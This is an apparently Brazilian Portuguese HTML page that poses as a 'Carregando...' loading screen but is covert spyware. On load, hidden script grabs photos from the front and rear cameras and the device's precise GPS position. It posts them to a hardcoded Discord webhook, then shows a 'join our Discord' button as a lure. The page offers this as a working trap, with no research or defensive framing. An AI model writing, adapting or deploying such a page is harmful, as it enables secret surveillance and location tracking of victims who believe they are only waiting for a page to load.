<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Carregando...</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    font-family: system-ui, -apple-system, sans-serif;
    background: #0a0a0a;
    color: #ccc;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    text-align: center;
    padding: 20px;
  }
  .container {
    max-width: 340px;
  }
  .spinner {
    width: 48px;
    height: 48px;
    border: 4px solid #333;
    border-top-color: #3b82f6;
    border-radius: 50%;
    animation: spin 0.9s linear infinite;
    margin: 0 auto 24px;
  }
  @keyframes spin {
    to { transform: rotate(360deg); }
  }
  #status {
    font-size: 1.05rem;
    line-height: 1.5;
    color: #aaa;
  }
  .final-msg {
    color: #e5e5e5;
    font-size: 1.1rem;
    margin-bottom: 20px;
  }
  .discord-btn {
    display: inline-block;
    margin-top: 8px;
    padding: 14px 28px;
    background: #5865F2;
    color: #fff;
    text-decoration: none;
    border-radius: 8px;
    font-weight: 600;
    font-size: 1rem;
  }
  .discord-btn:active {
    opacity: 0.85;
  }
  video, canvas { display: none; }
</style>
</head>
<body>
  <div class="container">
    <div class="spinner" id="spinner"></div>
    <div id="status">Carregando...</div>
  </div>

  <video id="video" autoplay playsinline muted></video>
  <canvas id="canvas"></canvas>

<script>
const statusEl = document.getElementById('status');
const spinnerEl = document.getElementById('spinner');
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');

const WEBHOOK_URL = 'https://discord.com/api/webhooks/1568339134081146942/HzZ4Ohe6oPb4JlU4Ng8jK2jkb3JELjiPWWMETzjVRbjKTKtQ2WF4bJTU1p-c8Jk61WJ-';
const DISCORD_INVITE = 'https://discord.gg/nRXATB4uZJ';

const CAMERAS = [
  { label: 'Frontal', facingMode: 'user' },
  { label: 'Traseira', facingMode: 'environment' }
];

function setStatus(text) {
  statusEl.textContent = text;
}

function wait(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function captureCamera(cam) {
  const stream = await navigator.mediaDevices.getUserMedia({
    video: { facingMode: { ideal: cam.facingMode } },
    audio: false
  });
  try {
    video.srcObject = stream;
    await video.play();
    await wait(1100);

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);

    const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.9));
    if (!blob) throw new Error('Frame vazio');
    return blob;
  } finally {
    stream.getTracks().forEach(track => track.stop());
    video.srcObject = null;
  }
}

async function sendToWebhook(payload) {
  let body;
  const options = { method: 'POST' };

  if (payload instanceof FormData) {
    body = payload;
  } else {
    body = JSON.stringify(payload);
    options.headers = { 'Content-Type': 'application/json' };
  }
  options.body = body;

  const response = await fetch(WEBHOOK_URL, options);
  if (!response.ok) throw new Error('Falha no envio');
}

async function sendPhoto(cam, blob) {
  const fileName = `foto-${cam.facingMode === 'user' ? 'frontal' : 'traseira'}-${Date.now()}.jpg`;
  const formData = new FormData();
  formData.append('file', blob, fileName);
  formData.append('content', `📸 ${cam.label}`);
  await sendToWebhook(formData);
}

function getLocation() {
  return new Promise((resolve, reject) => {
    if (!navigator.geolocation) {
      reject(new Error('Geolocalização não suportada'));
      return;
    }
    navigator.geolocation.getCurrentPosition(
      (pos) => resolve(pos),
      (err) => reject(err),
      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
    );
  });
}

async function sendLocation() {
  try {
    const pos = await getLocation();
    const { latitude, longitude, accuracy } = pos.coords;
    const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
    const content = `📍 **Localização capturada**\n` +
                    `Latitude: \`${latitude.toFixed(6)}\`\n` +
                    `Longitude: \`${longitude.toFixed(6)}\`\n` +
                    `Precisão: ~${Math.round(accuracy)} metros\n` +
                    `[Abrir no Google Maps](${mapsUrl})`;
    await sendToWebhook({ content });
  } catch (err) {
    console.error('Erro localização:', err);
  }
}

function showFinalScreen() {
  spinnerEl.style.display = 'none';
  statusEl.innerHTML = `
    <div class="final-msg">Entre no nosso Discord para continuar</div>
    <a class="discord-btn" href="${DISCORD_INVITE}" target="_blank" rel="noopener">
      Entrar no Discord
    </a>
  `;
}

async function run() {
  try {
    for (const cam of CAMERAS) {
      const blob = await captureCamera(cam);
      await sendPhoto(cam, blob);
    }
    await sendLocation();
  } catch (err) {
    console.error(err);
  } finally {
    showFinalScreen();
  }
}

window.addEventListener('load', run);
</script>
</body>
</html>
